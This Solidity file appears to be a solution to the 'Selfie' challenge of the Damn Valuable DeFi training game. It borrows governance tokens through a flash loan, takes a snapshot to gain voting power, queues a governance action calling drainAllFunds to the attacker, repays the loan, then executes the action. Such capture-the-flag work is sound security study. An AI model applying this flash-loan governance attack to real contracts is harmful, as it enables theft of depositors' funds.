pragma solidity ^0.6.0;

import "../DamnValuableTokenSnapshot.sol";

interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;
    function drainAllFunds(address receiver) external;
}

interface ISimpleGovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
}

contract AttackSelfie {
    address public owner;
    ISelfiePool public pool;
    ISimpleGovernance public governance;
    uint256 public actionId;

    constructor(ISelfiePool _pool, ISimpleGovernance _governance) public {
        owner = msg.sender;
        pool = _pool;
        governance = _governance;
    }

    function attack0(uint256 amount) public {
        pool.flashLoan(amount);
    }

    function receiveTokens(address _token, uint256 _amount) public {
        DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(_token);

        token.snapshot();

        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            owner
        );

        actionId = governance.queueAction(address(pool), data, 0);

        token.transfer(address(pool), _amount);
    }

    function attack1() public {
        governance.executeAction(actionId);
    }
}